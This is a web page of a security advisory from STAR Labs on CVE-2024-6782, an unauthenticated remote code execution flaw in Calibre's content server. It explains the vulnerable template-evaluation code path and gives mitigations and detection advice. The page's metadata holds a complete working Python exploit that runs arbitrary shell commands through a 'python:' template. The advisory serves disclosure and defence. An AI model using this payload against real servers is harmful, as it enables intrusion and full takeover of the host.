<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2024-6782) Calibre Remote Code Execution | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary    Product Calibre     Vendor Calibre   Severity Critical - Unprivileged adversaries may exploit software vulnerabilities to perform remote code execution   Affected Versions 6.9.0 ~ 7.14.0 (latest version as of writing)   Tested Versions 7.14.0   CVE Identifier CVE-2024-6782   CVE Description Improper Access Control in Calibre Content Server allows remote code execution   CWE Classification(s) CWE-863: Incorrect Authorization   CAPEC Classification(s) CAPEC-253: Remote Code Inclusion    CVSS3.">
<meta name="author" content="Amos Ng (@LFlare)">
<link rel="canonical" href="https://starlabs.sg/advisories/24/24-6782/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2024-6782) Calibre Remote Code Execution" />
<meta property="og:description" content="Summary    Product Calibre     Vendor Calibre   Severity Critical - Unprivileged adversaries may exploit software vulnerabilities to perform remote code execution   Affected Versions 6.9.0 ~ 7.14.0 (latest version as of writing)   Tested Versions 7.14.0   CVE Identifier CVE-2024-6782   CVE Description Improper Access Control in Calibre Content Server allows remote code execution   CWE Classification(s) CWE-863: Incorrect Authorization   CAPEC Classification(s) CAPEC-253: Remote Code Inclusion    CVSS3." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/24/24-6782/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2024-07-31T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-07-31T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2024-6782) Calibre Remote Code Execution"/>
<meta name="twitter:description" content="Summary    Product Calibre     Vendor Calibre   Severity Critical - Unprivileged adversaries may exploit software vulnerabilities to perform remote code execution   Affected Versions 6.9.0 ~ 7.14.0 (latest version as of writing)   Tested Versions 7.14.0   CVE Identifier CVE-2024-6782   CVE Description Improper Access Control in Calibre Content Server allows remote code execution   CWE Classification(s) CWE-863: Incorrect Authorization   CAPEC Classification(s) CAPEC-253: Remote Code Inclusion    CVSS3."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2024-6782) Calibre Remote Code Execution",
      "item": "https://starlabs.sg/advisories/24/24-6782/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2024-6782) Calibre Remote Code Execution",
  "name": "(CVE-2024-6782) Calibre Remote Code Execution",
  "description": "Summary    Product Calibre     Vendor Calibre   Severity Critical - Unprivileged adversaries may exploit software vulnerabilities to perform remote code execution   Affected Versions 6.9.0 ~ 7.14.0 (latest version as of writing)   Tested Versions 7.14.0   CVE Identifier CVE-2024-6782   CVE Description Improper Access Control in Calibre Content Server allows remote code execution   CWE Classification(s) CWE-863: Incorrect Authorization   CAPEC Classification(s) CAPEC-253: Remote Code Inclusion    CVSS3.",
  "keywords": [
    
  ],
  "articleBody": "Summary    Product Calibre     Vendor Calibre   Severity Critical - Unprivileged adversaries may exploit software vulnerabilities to perform remote code execution   Affected Versions 6.9.0 ~ 7.14.0 (latest version as of writing)   Tested Versions 7.14.0   CVE Identifier CVE-2024-6782   CVE Description Improper Access Control in Calibre Content Server allows remote code execution   CWE Classification(s) CWE-863: Incorrect Authorization   CAPEC Classification(s) CAPEC-253: Remote Code Inclusion    CVSS3.1 Scoring System Base Score: 9.8 (Critical) Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Product Overview Calibre is a cross-platform free and open-source suite of e-book software. Calibre supports organizing existing e-books into virtual libraries, displaying, editing, creating and converting e-books, as well as syncing e-books with a variety of e-readers. Editing books is supported for EPUB and AZW3 formats. Books in other formats like MOBI must first be converted to those formats, if they are to be edited. Calibre also has a large collection of community contributed plugins.\nCalibre also offers a powerful content server feature. This allows users to share their Calibre libraries over the internet, making it easy to access your e-book collection from anywhere, at any time\nVulnerability Summary Unauthenticated remote code execution via Calibre’s content server in Calibre Vulnerability Details The source of the vulnerability is in cmd_list.py, that is called by the cdb.py router. The router imports a secondary module (in the format cmd_*.py) based on the incoming HTTP request’s path. In this case, a request to /cdb/cmd/list will result in the file cmd_list.py being imported and its implementation() function will be executed. Additionally, the request body’s content is used as *args.\n The list of cmd_*.py files can be obtained from the src/calibre/db/cli/ directory.\n # src/calibre/srv/cdb.py#L28 @endpoint('/cdb/cmd/{which}/{version=0}', postprocess=msgpack_or_json, methods=receive_data_methods, cache_control='no-cache') def cdb_run(ctx, rd, which, version): try: m = module_for_cmd(which) except ImportError: raise HTTPNotFound(f'No module named: {which}') if not getattr(m, 'readonly', False): # [1] ctx.check_for_write_access(rd) [...snip...] try: result = m.implementation(db, partial(ctx.notify_changes, db.backend.library_path), *args) # [2] The vulnerable function is located at cmd_list.py::implementation(), so at [1], if the readonly module variable is False or absent, the function check_for_write_access() would not trigger and code execution can continue. The implementation() function of cmd_list.py module is then executed with user-controlled arguments *args at [2].\nIn the cmd_list::implementation() function, it can be seen that user-input is used as a search string to query the library for books. Additionally, a template can also be supplied by the user to be run against the search results.\n# src/calibre/db/cli/cmd_list.py#L15 readonly = True [...snip...] def implementation( db, notify_changes, fields, sort_by, ascending, search_text, limit, template=None ): [...snip...] if field == 'template': vals = {} global_vars = {} if formatter is None: from calibre.ebooks.metadata.book.formatter import SafeFormat formatter = SafeFormat() for book_id in book_ids: mi = db.get_proxy_metadata(book_id) vals[book_id] = formatter.safe_format(template, {}, 'TEMPLATE ERROR', mi, global_vars=global_vars) The template is processed with formatter.safe_format(), which evaluates the user-controlled template string without any proper input sanitisation.\n# src/calibre/utils/formatter.py#L1936 def safe_format(self, fmt, kwargs, error_value, book, column_name=None, template_cache=None, strip_results=True, template_functions=None, global_vars=None, break_reporter=None, python_context_object=None): state = self.save_state() [...snip...] try: ans = self.evaluate(fmt, [], kwargs, self.global_vars, break_reporter=break_reporter) Finally, the evaluate() function appears to allow for arbitrary execution of any Python code if it is prefixed with python:.\n# src/calibre/utils/formatter.py#L1840 def evaluate(self, fmt, args, kwargs, global_vars, break_reporter=None): if fmt.startswith('program:'): ans = self._eval_program(kwargs.get('$', None), fmt[8:], self.column_name, global_vars, break_reporter) elif fmt.startswith('python:'): ans = self._eval_python_template(fmt[7:], self.column_name) else: ans = self.vformat(fmt, args, kwargs) if self.strip_results: ans = self.compress_spaces.sub(' ', ans) if self.strip_results: ans = ans.strip(' ') return ans Exploit Conditions This vulnerability can be exploited by an unauthenticated attacker with the default configuration of Calibre’s content server which has basic authentication disabled by default, or by any privileged authenticated attacker.\nProof-of-Concept We have tried our best to make the PoC as portable and cross-platform as possible. This report includes a functional exploit written in Python3 that automatically performs the remote code execution.\nA sample exploit script is shown below:\n#! /usr/bin/env python3 # PoC for: CVE-2024-6782 # Description: Unauthenticated remote code execution in calibre # Written by: Amos Ng (@LFlare) import json import sys import requests _target = \"http://localhost:8080\" def exploit(cmd): r = requests.post( f\"{_target}/cdb/cmd/list\", headers={\"Content-Type\": \"application/json\"}, json=[ [\"template\"], \"\", # sortby: leave empty \"\", # ascending: leave empty \"\", # search_text: leave empty, set to all 1, # limit results f\"python:def evaluate(a, b):\\nimport subprocess\\ntry:\\nreturn subprocess.check_output(['cmd.exe', '/c', '{cmd}']).decode()\\nexcept Exception:\\nreturn subprocess.check_output(['sh', '-c', '{cmd}']).decode()\", # payload ], ) try: print(list(r.json()[\"result\"][\"data\"][\"template\"].values())[0]) except Exception as e: print(r.text) if __name__ == \"__main__\": exploit(\"whoami\") Suggested Mitigations Ensure that access controls on publicly accessible endpoints are properly implemented. If code execution is allowed by design, the server should not be exposed publicly, or it should be heavily restricted to highly privileged users only.\nDetection Guidance It is possible to detect potential exploitation of the vulnerability by checking the server’s access logs for repeated POST requests to the /cdb/cmd/list endpoint.\nCredits Amos Ng (@LFlare) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\n",
  "wordCount" : "822",
  "inLanguage": "en",
  "datePublished": "2024-07-31T00:00:00Z",
  "dateModified": "2024-07-31T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Amos Ng (@LFlare)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/24/24-6782/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2024-6782) Calibre Remote Code Execution
    </h1>
    <div class="post-meta"><span title='2024-07-31 00:00:00 +0000 UTC'>July 31, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;Amos Ng (@LFlare)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary">Summary</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System">CVSS3.1 Scoring System</a></li>
                <li>
                    <a href="#product-overview" aria-label="Product Overview">Product Overview</a></li>
                <li>
                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary">Vulnerability Summary</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details">Vulnerability Details</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions">Exploit Conditions</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept">Proof-of-Concept</a></li>
                <li>
                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations">Suggested Mitigations</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance">Detection Guidance</a></li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Calibre</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Calibre</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>Critical - Unprivileged adversaries may exploit software vulnerabilities to perform remote code execution</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>6.9.0 ~ 7.14.0 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>7.14.0</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2024-6782</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Improper Access Control in Calibre Content Server allows remote code execution</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-863: Incorrect Authorization</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-253: Remote Code Inclusion</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 9.8 (Critical)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h2 id="product-overview">Product Overview<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
<p>Calibre is a cross-platform free and open-source suite of e-book software. Calibre supports organizing existing e-books into virtual libraries, displaying, editing, creating and converting e-books, as well as syncing e-books with a variety of e-readers. Editing books is supported for EPUB and AZW3 formats. Books in other formats like MOBI must first be converted to those formats, if they are to be edited. Calibre also has a large collection of community contributed plugins.</p>
<p>Calibre also offers a powerful content server feature. This allows users to share their Calibre libraries over the internet, making it easy to access your e-book collection from anywhere, at any time</p>
<h2 id="vulnerability-summary">Vulnerability Summary<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
<p>Unauthenticated remote code execution via Calibre&rsquo;s content server in Calibre &lt;= 7.14.0.</p>
<h2 id="vulnerability-details">Vulnerability Details<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>The source of the vulnerability is in <code>cmd_list.py</code>, that is called by the <code>cdb.py</code> router. The router imports a secondary module (in the format <code>cmd_*.py</code>) based on the incoming HTTP request&rsquo;s path. In this case, a request to <code>/cdb/cmd/list</code> will result in the file <code>cmd_list.py</code> being imported and its <code>implementation()</code> function will be executed. Additionally, the request body&rsquo;s content is used as <code>*args</code>.</p>
<blockquote>
<p>The list of <code>cmd_*.py</code> files can be obtained from the <code>src/calibre/db/cli/</code> directory.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># src/calibre/srv/cdb.py#L28</span>
</span></span><span class="line"><span class="cl"><span class="nd">@endpoint</span><span class="p">(</span><span class="s1">&#39;/cdb/cmd/</span><span class="si">{which}</span><span class="s1">/{version=0}&#39;</span><span class="p">,</span> <span class="n">postprocess</span><span class="o">=</span><span class="n">msgpack_or_json</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="n">receive_data_methods</span><span class="p">,</span> <span class="n">cache_control</span><span class="o">=</span><span class="s1">&#39;no-cache&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">cdb_run</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">rd</span><span class="p">,</span> <span class="n">which</span><span class="p">,</span> <span class="n">version</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">module_for_cmd</span><span class="p">(</span><span class="n">which</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">HTTPNotFound</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;No module named: </span><span class="si">{</span><span class="n">which</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s1">&#39;readonly&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">):</span> <span class="c1"># [1]</span>
</span></span><span class="line"><span class="cl">        <span class="n">ctx</span><span class="o">.</span><span class="n">check_for_write_access</span><span class="p">(</span><span class="n">rd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="o">...</span><span class="n">snip</span><span class="o">...</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">implementation</span><span class="p">(</span><span class="n">db</span><span class="p">,</span> <span class="n">partial</span><span class="p">(</span><span class="n">ctx</span><span class="o">.</span><span class="n">notify_changes</span><span class="p">,</span> <span class="n">db</span><span class="o">.</span><span class="n">backend</span><span class="o">.</span><span class="n">library_path</span><span class="p">),</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span> <span class="c1"># [2]</span>
</span></span></code></pre></div><p>The vulnerable function is located at <code>cmd_list.py::implementation()</code>, so at [1], if the <code>readonly</code> module variable is <code>False</code> or absent, the function <code>check_for_write_access()</code> would not trigger and code execution can continue. The <code>implementation()</code> function of <code>cmd_list.py</code> module is then executed with user-controlled arguments <code>*args</code> at [2].</p>
<p>In the <code>cmd_list::implementation()</code> function, it can be seen that user-input is used as a search string to query the library for books. Additionally, a template can also be supplied by the user to be run against the search results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># src/calibre/db/cli/cmd_list.py#L15</span>
</span></span><span class="line"><span class="cl"><span class="n">readonly</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">...</span><span class="n">snip</span><span class="o">...</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">implementation</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">db</span><span class="p">,</span> <span class="n">notify_changes</span><span class="p">,</span> <span class="n">fields</span><span class="p">,</span> <span class="n">sort_by</span><span class="p">,</span> <span class="n">ascending</span><span class="p">,</span> <span class="n">search_text</span><span class="p">,</span> <span class="n">limit</span><span class="p">,</span> <span class="n">template</span><span class="o">=</span><span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="o">...</span><span class="n">snip</span><span class="o">...</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">field</span> <span class="o">==</span> <span class="s1">&#39;template&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">vals</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="n">global_vars</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">formatter</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="kn">from</span> <span class="nn">calibre.ebooks.metadata.book.formatter</span> <span class="kn">import</span> <span class="n">SafeFormat</span>
</span></span><span class="line"><span class="cl">            <span class="n">formatter</span> <span class="o">=</span> <span class="n">SafeFormat</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">book_id</span> <span class="ow">in</span> <span class="n">book_ids</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">mi</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">get_proxy_metadata</span><span class="p">(</span><span class="n">book_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">vals</span><span class="p">[</span><span class="n">book_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">formatter</span><span class="o">.</span><span class="n">safe_format</span><span class="p">(</span><span class="n">template</span><span class="p">,</span> <span class="p">{},</span> <span class="s1">&#39;TEMPLATE ERROR&#39;</span><span class="p">,</span> <span class="n">mi</span><span class="p">,</span> <span class="n">global_vars</span><span class="o">=</span><span class="n">global_vars</span><span class="p">)</span>
</span></span></code></pre></div><p>The template is processed with <code>formatter.safe_format()</code>, which evaluates the user-controlled template string without any proper input sanitisation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># src/calibre/utils/formatter.py#L1936</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">safe_format</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">kwargs</span><span class="p">,</span> <span class="n">error_value</span><span class="p">,</span> <span class="n">book</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">column_name</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">template_cache</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">strip_results</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">template_functions</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">global_vars</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">break_reporter</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">python_context_object</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">state</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">save_state</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> <span class="p">[</span><span class="o">...</span><span class="n">snip</span><span class="o">...</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">ans</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="p">[],</span> <span class="n">kwargs</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">global_vars</span><span class="p">,</span> <span class="n">break_reporter</span><span class="o">=</span><span class="n">break_reporter</span><span class="p">)</span>
</span></span></code></pre></div><p>Finally, the <code>evaluate()</code> function appears to allow for arbitrary execution of any Python code if it is prefixed with <code>python:</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># src/calibre/utils/formatter.py#L1840</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">kwargs</span><span class="p">,</span> <span class="n">global_vars</span><span class="p">,</span> <span class="n">break_reporter</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="n">fmt</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;program:&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">  <span class="n">ans</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_eval_program</span><span class="p">(</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;$&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">),</span> <span class="n">fmt</span><span class="p">[</span><span class="mi">8</span><span class="p">:],</span>
</span></span><span class="line"><span class="cl">         <span class="bp">self</span><span class="o">.</span><span class="n">column_name</span><span class="p">,</span> <span class="n">global_vars</span><span class="p">,</span> <span class="n">break_reporter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="k">elif</span> <span class="n">fmt</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;python:&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">  <span class="n">ans</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_eval_python_template</span><span class="p">(</span><span class="n">fmt</span><span class="p">[</span><span class="mi">7</span><span class="p">:],</span> <span class="bp">self</span><span class="o">.</span><span class="n">column_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">ans</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">vformat</span><span class="p">(</span><span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">kwargs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">strip_results</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">ans</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">compress_spaces</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="n">ans</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">strip_results</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">ans</span> <span class="o">=</span> <span class="n">ans</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">ans</span>
</span></span></code></pre></div><p><img loading="lazy" src="/advisories/24/images/CVE-2024-6782_01.calibre-rce.gif" alt=""  />
</p>
<h2 id="exploit-conditions">Exploit Conditions<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>This vulnerability can be exploited by an unauthenticated attacker with the default configuration of Calibre&rsquo;s content server which has basic authentication disabled by default, or by any privileged authenticated attacker.</p>
<h2 id="proof-of-concept">Proof-of-Concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<p>We have tried our best to make the PoC as portable and cross-platform as possible. This report includes a functional exploit written in Python3 that automatically performs the remote code execution.</p>
<p>A sample exploit script is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#! /usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># PoC for: CVE-2024-6782</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Description: Unauthenticated remote code execution in calibre &lt;= 7.14.0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Written by: Amos Ng (@LFlare)</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">_target</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8080&#34;</span>
</span></span><span class="line"><span class="cl">
